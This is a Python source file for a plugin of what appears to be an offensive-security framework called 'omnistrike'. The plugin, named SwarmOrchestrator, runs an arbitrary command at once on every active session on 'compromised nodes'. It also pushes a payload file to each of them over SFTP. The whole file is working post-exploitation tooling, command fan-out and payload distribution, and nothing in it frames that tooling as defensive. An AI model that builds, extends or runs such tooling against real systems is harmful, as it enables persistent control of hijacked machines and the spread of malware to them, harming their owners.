import asyncio
from omnistrike.plugins.base import BasePlugin

class SwarmOrchestratorPlugin(BasePlugin):
    @property
    def name(self):
        return "SwarmOrchestrator"

    @property
    def description(self):
        return "Coordinates tasks and command execution across multiple compromised nodes (Swarm Mode)."

    async def run(self, target, data):
        sessions = self.session_manager.list_sessions()
        if not sessions:
            print("[*] No active assets available for Swarm coordination.")
            return

        print(f"[*] Initializing Swarm Mode across {len(sessions)} nodes...")
        swarm_task = data.get('swarm_command', 'id')

        results = {}
        tasks = []

        async def execute_on_node(session, cmd):
            try:
                # print(f"    [>] Swarm executing on Session {session.id} ({session.target})...")
                res = await session.conn.run(cmd)
                return session.id, res.stdout.strip()
            except Exception as e:
                return session.id, f"ERROR: {str(e)}"

        for session in sessions:
            if session.status == "Active":
                tasks.append(execute_on_node(session, swarm_task))

        if tasks:
            completed_tasks = await asyncio.gather(*tasks)
            for sid, res in completed_tasks:
                results[sid] = res

        data['swarm_results'] = results
        print(f"[*] Swarm execution complete. Results gathered from {len(results)} nodes.")

    async def distribute_payload(self, local_path, remote_path):
        """
        Distributes a payload file to all active swarm nodes.
        """
        sessions = self.session_manager.list_sessions()
        for session in sessions:
            if session.status == "Active":
                try:
                    async with session.conn.start_sftp_client() as sftp:
                        await sftp.put(local_path, remote_path)
                    print(f"[*] Payload distributed to Session {session.id}")
                except Exception as e:
                    print(f"[!] Failed to distribute to Session {session.id}: {e}")
